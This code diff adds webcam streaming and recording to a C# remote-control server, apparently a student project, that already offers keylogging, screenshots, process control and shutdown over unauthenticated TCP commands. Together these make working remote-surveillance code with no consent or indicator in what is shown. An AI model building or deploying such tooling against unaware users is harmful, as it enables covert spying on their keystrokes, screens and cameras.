@@ -14,14 +14,26 @@ using System.Diagnostics;
 using System.Drawing.Imaging;
 using System.Threading;
 using KeyLogger;
-
+using AForge.Video;
+using AForge.Video.DirectShow;
+using Accord.Video.FFMPEG; // Thư viện quay phim bạn vừa tải
+using System.Runtime.ExceptionServices; // Bắt buộc có dòng này
+using System.Security;
 namespace ServerApp
 {
     public partial class server : Form
     {
         Thread serverThread; // Luồng chính để chạy Server lắng nghe
         Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI
-
+        // --- KHAI BÁO BIẾN WEBCAM (THÊM MỚI) ---
+        Thread videoServerThread; // Luồng chạy server video (Port 5657)
+        VideoCaptureDevice videoSource; // Thiết bị Webcam
+        VideoFileWriter writer;   // Biến ghi hình của Accord
+        bool isStreaming = false;
+        bool isRecording = false;
+        Socket videoClient;       // Socket gửi ảnh
+        string currentVideoFile = "";
+        // ---------------------------------------
         public server()
         {
             InitializeComponent();
@@ -40,6 +52,7 @@ namespace ServerApp
         // Đảm bảo ngắt toàn bộ tiến trình khi đóng Form
         private void server_FormClosing(object sender, FormClosingEventArgs e)
         {
+            StopWebcam();
             System.Diagnostics.Process.GetCurrentProcess().Kill();
         }
 
@@ -53,6 +66,10 @@ namespace ServerApp
             serverThread = new Thread(StartServerLoop);
             serverThread.IsBackground = true;
             serverThread.Start();
+            // --- THÊM MỚI: Chạy Server Video ở Port 5657 ---
+            videoServerThread = new Thread(StartVideoServer);
+            videoServerThread.IsBackground = true;
+            videoServerThread.Start();
         }
 
         // Vòng lặp chính: Lắng nghe kết nối TCP tại Port 5656
@@ -78,6 +95,7 @@ namespace ServerApp
 
                         // Chuyển sang xử lý lệnh
                         HandleClientCommunication();
+
                     }
                     catch { }
                 }
@@ -90,21 +108,62 @@ namespace ServerApp
         }
 
         // Phân tích cú pháp lệnh gửi từ Client
+        // File: server.cs - Cập nhật hàm HandleClientCommunication
+
         private void HandleClientCommunication()
         {
             String s = "";
             while (true)
             {
-                receiveSignal(ref s);
+                receiveSignal(ref s); // Đọc 1 dòng từ Python
+
+                // Python gửi gì, C# bắt cái đó chính xác 1-1
                 switch (s)
                 {
-                    case "KEYLOG": keylog(); break;     // Chuyển sang xử lý Keylog
+
+                    case "KEYLOG": keylog(); break;
+                    case "PROCESS": process(); break;
+                    case "APPLICATION": application(); break;
+                    case "TAKEPIC": takepic(); break;
                     case "SHUTDOWN": System.Diagnostics.Process.Start("ShutDown", "-s"); break;
                     case "RESTART": System.Diagnostics.Process.Start("shutdown", "/r /t 0"); break;
-                    case "TAKEPIC": takepic(); break;   // Chụp màn hình
-                    case "PROCESS": process(); break;   // Quản lý tiến trình
-                    case "APPLICATION": application(); break; // Quản lý ứng dụng
-                    case "QUIT": return; // Ngắt kết nối hiện tại
+
+                    // --- NHÓM LỆNH WEBCAM (MỞ RỘNG DỄ DÀNG) ---
+                    // Nếu sau này bạn muốn thêm tính năng "ZOOM", chỉ cần thêm case "WEBCAM_ZOOM"
+
+                    case "WEBCAM_START":
+                        isStreaming = true;
+                        StartWebcam();
+                        Program.nw.WriteLine("Webcam Started"); // Phản hồi cho Python
+                        Program.nw.Flush();
+                        break;
+
+                    case "WEBCAM_STOP":
+                        isStreaming = false;
+                        isRecording = false;
+                        StopWebcam();
+                        Program.nw.WriteLine("Webcam Stopped"); // Phản hồi
+                        Program.nw.Flush();
+                        break;
+
+                    case "WEBCAM_RECORD_ON":
+                        StartRecording();
+                        Program.nw.WriteLine("Recording Started"); // Phản hồi
+                        Program.nw.Flush();
+                        break;
+
+                    case "WEBCAM_RECORD_OFF":
+                        isRecording = false;
+                        if (writer != null && writer.IsOpen) writer.Close();
+                        Program.nw.WriteLine("Recording Saved"); // Phản hồi
+                        Program.nw.Flush();
+                        break;
+
+                    // --- THOÁT ---
+                    case "QUIT": return;
+
+                    // Default để tránh treo nếu nhận lệnh rác
+                    default: break;
                 }
             }
         }
@@ -284,6 +343,164 @@ namespace ServerApp
                     }
                 }
             }
+        }
+        // ==========================================================
+        // KHU VỰC HÀM XỬ LÝ WEBCAM & RECORDING (THÊM MỚI TOÀN BỘ)
+        // ==========================================================
+
+        // 1. Hàm khởi tạo Server Video tại Port 5657
+        private void StartVideoServer()
+        {
+            try
+            {
+                IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5657);
+                Socket vServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                vServer.Bind(ip);
+                vServer.Listen(10);
+                while (true)
+                {
+                    videoClient = vServer.Accept();
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Lỗi Port 5657: " + ex.Message);
+            }
+        }
+
+        // 2. Bật Webcam
+        [HandleProcessCorruptedStateExceptions]
+        [SecurityCritical]
+        void StartWebcam()
+        {
+            try
+            {
+                FilterInfoCollection videos = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+
+                if (videos.Count == 0)
+                {
+                    MessageBox.Show("Lỗi: Không tìm thấy Webcam nào!");
+                    return;
+                }
+
+                // Lấy Camera đầu tiên
+                // Nếu gặp OBS Camera lỗi, thuộc tính bên trên sẽ chặn việc sập nguồn
+                videoSource = new VideoCaptureDevice(videos[0].MonikerString);
+                videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
+                videoSource.Start();
+            }
+            catch (Exception ex)
+            {
+                // Bây giờ nó sẽ hiện lỗi ra đây thay vì tắt bụp chương trình
+                MessageBox.Show("Đã bỏ qua lỗi Driver Camera: " + ex.Message);
+            }
+        }
+
+        // 3. Tắt Webcam và đóng file ghi hình
+        void StopWebcam()
+        {
+            if (videoSource != null && videoSource.IsRunning)
+            {
+                videoSource.SignalToStop();
+                videoSource = null;
+            }
+            if (writer != null && writer.IsOpen)
+            {
+                writer.Close();
+                writer.Dispose();
+            }
+        }
+
+        // 4. Bắt đầu Ghi hình (Dùng Accord)
+        void StartRecording()
+        {
+            try
+            {
+                // 1. Tạo tên file mới dựa trên giờ hiện tại
+                currentVideoFile = "Record_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".avi";
+
+                // 2. Đảm bảo writer cũ đã đóng trước khi bắt đầu cái mới
+                if (writer != null)
+                {
+                    writer.Dispose();
+                    writer = null;
+                }
+
+                // 3. Chỉ bật cờ hiệu, chưa mở file ngay (để dành việc mở file cho hàm video_NewFrame)
+                isRecording = true;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Lỗi bật ghi hình: " + ex.Message);
+            }
+        }
+
+        // 5. Sự kiện xử lý từng khung hình (Quan trọng)
+        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
+        {
+            try
+            {
+                // Clone ảnh từ Camera ra để xử lý
+                Bitmap image = (Bitmap)eventArgs.Frame.Clone();
+
+                // --- PHẦN 1: XỬ LÝ GHI HÌNH (RECORD) ---
+                if (isRecording)
+                {
+                    // Kiểm tra: Nếu file chưa mở thì mở ngay bây giờ
+                    // Lúc này ta dùng chính kích thước của 'image' để mở file
+                    if (writer == null)
+                    {
+                        writer = new VideoFileWriter();
+
+                        // QUAN TRỌNG: image.Width và image.Height là kích thước thật của Camera
+                        // Bitrate 2000000 (2Mbps) giúp video nét hơn
+                        writer.Open(currentVideoFile, image.Width, image.Height, 25, VideoCodec.MPEG4, 2000000);
+                    }
+
+                    // Nếu file đang mở thì ghi hình vào
+                    if (writer.IsOpen)
+                    {
+                        writer.WriteVideoFrame(image);
+                    }
+                }
+
+                // --- PHẦN 2: XỬ LÝ TRUYỀN HÌNH (STREAMING) ---
+                // (Đoạn này giữ nguyên logic cũ để truyền qua mạng)
+                if (isStreaming && videoClient != null && videoClient.Connected)
+                {
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        // Nén ảnh JPEG chất lượng 50%
+                        EncoderParameters myEncoderParameters = new EncoderParameters(1);
+                        myEncoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L);
+
+                        image.Save(ms, GetEncoderInfo("image/jpeg"), myEncoderParameters);
+
+                        byte[] buffer = ms.ToArray();
+                        byte[] sizeInfo = Encoding.ASCII.GetBytes(buffer.Length.ToString() + "\n");
+
+                        // Gửi kích thước -> Gửi ảnh
+                        videoClient.Send(sizeInfo);
+                        videoClient.Send(buffer);
+                    }
+                }
+
+                // Giải phóng bộ nhớ ảnh
+                image.Dispose();
+            }
+            catch
+            {
+                // Bỏ qua lỗi nếu bị drop frame để tránh crash
+            }
+        }
+
+        // 6. Hàm phụ trợ nén ảnh
+        private static ImageCodecInfo GetEncoderInfo(String mimeType)
+        {
+            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
+            foreach (ImageCodecInfo codec in codecs)
+                if (codec.MimeType == mimeType) return codec;
+            return null;
         }
     }
 }
